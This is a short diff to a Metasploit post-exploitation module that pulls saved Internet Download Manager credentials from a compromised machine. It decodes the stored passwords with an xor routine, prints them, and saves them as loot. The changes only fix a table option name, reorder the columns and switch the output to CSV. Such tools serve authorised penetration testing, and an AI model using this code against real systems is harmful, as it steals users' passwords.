@@ -41,12 +41,12 @@ class Metasploit3 < Msf::Post
 	def run
 		creds = Rex::Ui::Text::Table.new(
 				'Header'  => 'Internet Downloader Manager Credentials',
-				'Ident'   => 1,
+				'Indent'   => 1,
 				'Columns' =>
 				[
-					'Site',
 					'User',
-					'Password'
+					'Password',
+					'Site'
 				]
 			)
 
@@ -69,16 +69,16 @@ class Metasploit3 < Msf::Post
 					next if epass == nil or epass == ""
 					pass = xor(epass)
 					print_good("Site: #{site} (User=#{user}, Password=#{pass})")
-					creds << [site, user, pass]
+					creds << [user, pass, site]
 				end
 
 				print_status("Storing data...")
 				path = store_loot(
 					'idm.user.creds',
-					'text/plain',
+					'text/csv',
 					session,
-					creds,
-					'idm_user_creds.txt',
+					creds.to_csv,
+					'idm_user_creds.csv',
 					'Internet Download Manager User Credentials'
 				)
 
